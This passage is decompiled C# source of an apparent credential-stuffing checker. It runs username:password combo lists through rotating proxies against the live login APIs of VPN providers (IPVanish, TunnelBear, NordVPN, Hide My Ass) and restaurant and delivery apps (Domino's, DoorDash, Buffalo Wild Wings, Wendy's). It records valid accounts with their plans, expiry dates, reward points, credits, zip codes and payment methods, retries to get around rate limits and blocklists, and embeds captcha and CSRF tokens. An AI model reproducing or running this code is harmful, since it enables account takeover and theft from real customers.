				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://account.ipvanish.com/api/v3/login", "{\"username\":\"" + text + "\",\"password\":\"" + text2 + "\",\"os\":\"iOS_13_2_3\",\"api_key\":\"185f600f32cee535b0bef41ad77c1acd\",\"client\":\"IPVanishVPN_iOS_3.5.0_36386\",\"uuid\":\"F1D257D2-4B14-4F5B-B68E-B4C74B0F4101\"}", "application/json").ToString();
				if (text5.Contains("account_type"))
				{
					string text6 = Parse(text5, "\"account_type\":", ",");
					if (text6.Contains("3"))
					{
						Colorful.Console.WriteLine("[BANNED] " + text3, Color.Red);
						Combos.Results(text3, "Banned", "IPvanish");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
						continue;
					}
					int num = (int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
					string value = Parse(text5, "\"sub_end_epoch\":", ",").ToString();
					double value2 = Convert.ToDouble(value);
					DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0).AddSeconds(value2);
					string text7 = dateTime.ToShortDateString() + " " + dateTime.ToShortTimeString();
					string text8 = text7;
					int num2 = Convert.ToInt32(value);
					if (num > num2)
					{
						Colorful.Console.WriteLine("[EXPIRED] " + text3 + " | Expiry = " + text8, Color.Yellow);
						Combos.Results(text3 + " | Expiry = " + text8, "Expired", "IPvanish");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
					else
					{
						Colorful.Console.WriteLine("[GOOD] " + text3 + " | Expiry = " + text8, Color.Green);
						Combos.Results(text3 + " | Expiry = " + text8, "Hits", "IPvanish");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
				}
				else if (text5.Contains("The username or password provided is incorrect"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("code\":1100"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startTunnelBear()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.AddHeader("origin", "https://www.tunnelbear.com");
				httpRequest.AddHeader("referer", "https://www.tunnelbear.com/account/login");
				httpRequest.AddHeader("sec-fetch-dest", "empty");
				httpRequest.AddHeader("sec-fetch-mode", "cors");
				httpRequest.AddHeader("sec-fetch-site", "same-site");
				httpRequest.AddHeader("tb-csrf-token", "56ca73e9f06006c3cc6a678386a4d704a8226a98");
				httpRequest.AddHeader("x-xsrf-token", "56ca73e9f06006c3cc6a678386a4d704a8226a98");
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://api.tunnelbear.com/core/web/api/login", "username=" + text + "&password=" + text2 + "&withUserDetails=true&v=web-1.0", "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("PASS"))
				{
					string text6 = Parse(text5, "\"fullVersion\":\"", "\",");
					if (text6.Contains("1"))
					{
						string text7 = Parse(text5, "\"bearType\":\"", "\"");
						string text8 = Parse(text5, "\"fullVersionUntil\":\"", "\"");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Expires = " + text8 + " Plan = " + text7, Color.Green);
						Combos.Results(text3 + " Expires = " + text8 + " Plan = " + text7, "Hits", "Tunnel Bear");
					}
					else if (text6.Contains("0"))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "Tunnel Bear");
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
					}
					else
					{
						string text9 = Parse(text5, "\"bearType\":\"", "\"");
						string text10 = Parse(text5, "\"fullVersionUntil\":\"", "\"");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Expires = " + text10 + " Plan = " + text9, Color.Green);
						Combos.Results(text3 + " Expires = " + text10 + " Plan = " + text9, "Hits", "Tunnel Bear");
					}
				}
				else if (text5.Contains("Blocklisted"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("error code: 1006"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("Rate limiting"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("Access denied"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startNord()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				_ = "username=" + text + "&password=" + text2;
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://zwyr157wwiu6eior.com/v1/users/tokens", "username=" + text + "&password=" + text2, "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("token"))
				{
					DateTime.Now.ToString("yyyy-MM-dd'T'HH:mm:ss zzz");
					string str = Parse(text5, "\"token\":\"", "\"");
					string str2 = Base64Encode("token:" + str);
					httpRequest.ClearAllHeaders();
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
					httpRequest.AddHeader("Authorization", "Basic " + str2);
					string text6 = httpRequest.Get("https://zwyr157wwiu6eior.com/v1/users/services").ToString();
					if (text6.Contains("created_at"))
					{
						System.Console.ForegroundColor = ConsoleColor.Green;
						System.Console.WriteLine("[GOOD] " + text3);
						Checker.Increment_CPM++;
						Variables.Hits++;
						Variables.Progress++;
						Combos.Results(text3, "Hits", "NordVPN");
					}
					else
					{
						if (ShowFails)
						{
							Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
						}
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
					}
				}
				else if (text5.Contains("Unauthorized"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("502: Bad gateway"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startHma()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.AddHeader("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.AddHeader("Authorization", "Basic bW9iaXNvbDExMTE6a1pERVk2enMzZA==");
				httpRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://mobile.api.hmageo.com/clapi/v1.5/user/login", "username=" + text + "&password=" + text2, "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("token"))
				{
					string text6 = Parse(text5, "\"plan\":\"", "\"");
					string text7 = Parse(text5, "\"expires\":\"", "\"");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					Colorful.Console.WriteLine("[GOOD] " + text3 + " | Expires = " + text7 + " | Plan = " + text6, Color.Green);
					Combos.Results(text3 + " | Expires = " + text7 + " | Plan = " + text6, "Hits", "Hide My Ass");
				}
				else if (text5.Contains("503 Service Temporarily Unavailable"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("Invalid username/password"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startDomino()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				httpRequest.AddHeader("X-DPZ-CAPTCHA", "google-recaptcha-v3-enterprise-android;token=03AGdBq26_cnehx_Za0pPJIf3o3AIf2jQ8VAHANSJ2gagMPG9pAQTVmSW1FNrHdHTKzRcLyhX6m_T3DBUEx7APYI0Ndb35Q-llhHDYlwxuXnUHhE-_lZTZBqJY8G0aHclVFyOoDXJAZUnVu8GRgya3D2zDsd_FsprD9DG2zmdN4ZDXCYmMVUtq2j4xlhuMG6hMUORc0bP7387O-7-GZ6400lcGcGbrKHam4vSBTrdZ_cCcbsQ_S4OGB3MOdqaSqRYr1b87ouACovq1XzxoBk54ObfnsTHXebzttoE0aRuGNS3m75pcO5tjH8s;action=login");
				string text5 = httpRequest.Post("https://authproxy.dominos.com/auth-proxy-service/login", "username=" + text + "&password=" + text2 + "&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate&client_id=Android-rm&validator_id=VoldemortCredValidatorCustID&grant_type=password", "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("expires_in"))
				{
					string str = Parse(text5, "access_token\":\"", "\"");
					httpRequest.ClearAllHeaders();
					httpRequest.UserAgent = "DominosAndroid/7.4.0 (Android 5.1.1; samsung/SM-N950N; en)";
					httpRequest.AddHeader("Authorization", "Bearer " + str);
					httpRequest.AddHeader("X-DPZ-D", "d2794d3f42287595");
					httpRequest.AddHeader("X-DPZ-ADID", "836808c7-c9a1-4a01-84c1-6e7b7a30edb2");
					httpRequest.AddHeader("Host", "order.dominos.com");
					httpRequest.AddHeader("DPZ-Market", "UNITED_STATES");
					httpRequest.AddHeader("DPZ-Language", "en");
					string source = httpRequest.Post("https://order.dominos.com/power/login").ToString();
					string str2 = Parse(source, "CustomerID\":\"", "\"");
					httpRequest.ClearAllHeaders();
					httpRequest.UserAgent = "DominosAndroid/7.4.0 (Android 5.1.1; samsung/SM-N950N; en)";
					httpRequest.AddHeader("Authorization", "Bearer " + str);
					httpRequest.AddHeader("DPZ-Language", "en");
					httpRequest.AddHeader("DPZ-Market", "UNITED_STATES");
					httpRequest.AddHeader("X-DPZ-D", "d2794d3f42287595");
					httpRequest.AddHeader("X-DPZ-ADID", "836808c7-c9a1-4a01-84c1-6e7b7a30edb2");
					httpRequest.AddHeader("Host", "authproxy.dominos.com");
					string source2 = httpRequest.Get("https://order.dominos.com/power/customer/" + str2 + "/loyalty").ToString();
					string text6 = Parse(source2, "VestedPointBalance\":", ",");
					System.Console.ForegroundColor = ConsoleColor.Green;
					System.Console.WriteLine("[GOOD] " + text3 + " | Reward points: " + text6);
					Checker.Increment_CPM++;
					Variables.Hits++;
					Variables.Progress++;
					Combos.Results(text3 + " | Reward points: " + text6, "Hits", "Domino's");
				}
				else if (text5.Contains("Your account is locked"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("We could not locate a Pizza Profile with that e-mail and password combination"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("Invalid username & password"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else
				{
					Variables.ComboList.Add(text3);
				}
			}
		}

		public static void startDoordash()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				httpRequest.UserAgent = "okhttp/3.12.1";
				string text5 = httpRequest.Post("https://api.doordash.com/v2/auth/token/", "{\"client_id\":\"4010022695120400\",\"email\":\"" + text + "\",\"is_manual\":true,\"password\":\"" + text2 + "\"}", "application/json").ToString();
				if (text5.Contains("\"token\""))
				{
					string str = Parse(text5, "token\":\"", "\"");
					httpRequest.AddHeader("Authorization", "JWT " + str);
					string source = httpRequest.Get("https://api.doordash.com/v2/consumers/me/?expand=account_credits_monetary_fields&expand=default_payment_card&expand=referree_amount_monetary_fields&expand=referrer_amount_monetary_fields&fields=account_credits_monetary_fields&fields=account_credits_monetary_fields.currency&fields=account_credits_monetary_fields.decimal_places&fields=account_credits_monetary_fields.display_string&fields=account_credits_monetary_fields.unit_amount&fields=default_country_shortname&fields=default_address&fields=default_payment_card&fields=email&fields=first_name&fields=has_accepted_latest_terms_of_service&fields=has_usable_password&fields=id&fields=is_guest&fields=last_name&fields=num_orders_submitted&fields=phone_number&fields=receive_marketing_push_notifications&fields=receive_push_notifications&fields=receive_text_notifications&fields=referree_amount_monetary_fields&fields=referree_amount_monetary_fields.currency&fields=referree_amount_monetary_fields.decimal_places&fields=referree_amount_monetary_fields.display_string&fields=referree_amount_monetary_fields.unit_amount&fields=referrer_amount_monetary_fields&fields=referrer_amount_monetary_fields.currency&fields=referrer_amount_monetary_fields.decimal_places&fields=referrer_amount_monetary_fields.display_string&fields=referrer_amount_monetary_fields.unit_amount&fields=social_account_providers").ToString();
					string text6 = Parse(source, "country_code\":\"", "\",");
					string text7 = Parse(source, "display_string\":\"", "\",\"");
					string text8 = Parse(source, "\",\"zip_code\":\"", "\"},\"");
					Colorful.Console.WriteLine("[GOOD] " + text3 + " Country = " + text6 + " Credits = " + text7 + " Zip = " + text8, Color.Green);
					Combos.Results(text3 + " Country = " + text6 + " Credits = " + text7 + " Zip = " + text8, "Hits", "Doordash");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
				}
				else if (text5.Contains("to login with provided credentials"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("Login banned due to violation of terms of service"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("<title>406 Not Acceptable</title><"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startBww()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4", "{\"email\":\"" + text + "\",\"password\":\"" + text2 + "\",\"returnSecureToken\":true}", "application/json").ToString();
				if (text5.Contains("idToken"))
				{
					Colorful.Console.WriteLine("[GOOD] " + text3, Color.Green);
					Combos.Results(text3, "Hits", "BWW");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
				}
				else if (text5.Contains("INVALID_PASSWORD"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("EMAIL_NOT_FOUND"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("INVALID_ARGUMENT"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("INVALID_EMAIL"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startWendy()
		{
			Random random = new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.UserAgent = "Wendys/6.1.4 (iPhone; iOS 12.4.1; Scale/2.00)";
				string text5 = Guid.NewGuid().ToString();
				int num = random.Next(10000);
				int num2 = random.Next(10000);
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text6 = httpRequest.Post("https://customerservices.wendys.com/CustomerServices/rest/login?lang=en&cntry=US&sourceCode=MY_WENDYS&version=6.1.4", "{\"password\":\"" + text2 + "\",\"login\":\"" + text + "\",\"deviceId\":\"" + text5 + "\",\"keepSignedIn\":true,\"lng\":-87.7517254150" + num + ",\"lat\":42.021118164" + num2 + "}", "application/json").ToString();
				if (text6.Contains("serviceStatus\":\"SUCCESS\",\""))
				{
					string text7 = Parse(text6, "\"token\":\"", "\",");
					httpRequest.ClearAllHeaders();
					httpRequest.AddHeader("User-Agent", "okhttp/3.11.0");
					httpRequest.AddHeader("ADRUM_1", "isMobile:true");
					httpRequest.AddHeader("ADRUM", "isAjax:true");
					httpRequest.UserAgent = "okhttp/3.11.0";
					string text8 = httpRequest.Post("https://customerservices.wendys.com/CustomerServices/rest/balance/prepaid?version=5.21.0&sourceCode=MY_WENDYS&cntry=US&lang=en", "{\"token\":\"" + text7 + "\",\"deviceId\":\"" + text5 + "\"}", "application/json").ToString();
					if (text8.Contains("403 Forbidden"))
					{
						Variables.ComboList.Add(text3);
						Variables.Retries++;
						continue;
					}
					string text9 = Parse(text8, "\"amount\":\"", "\",");
					string source = httpRequest.Post("https://orderservice.wendys.com/OrderingServices/rest/paymentMethod/get?version=6.4.6&sourceCode=MY_WENDYS&cntry=US&lang=en", "{\"token\":\"" + text7 + "\",\"deviceId\":\"" + text5 + "\"}", "application/json").ToString();
					if (text9.Equals("1"))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "Wendy's");
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						continue;
					}
					if (text9.Equals("2"))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "Wendy's");
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						continue;
					}
					if (text9.Equals("3"))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "Wendy's");
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						continue;
					}
					if (text9.Equals("4"))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "Wendy's");
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						continue;
					}
					if (text9.Equals("5"))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "Wendy's");
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						continue;
					}
					if (text8.Contains("403 Forbidden"))
					{
						Variables.ComboList.Add(text3);
						Variables.Retries++;
						continue;
					}
					string text10 = Parse(source, "\"methodName\":\"", "\",");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
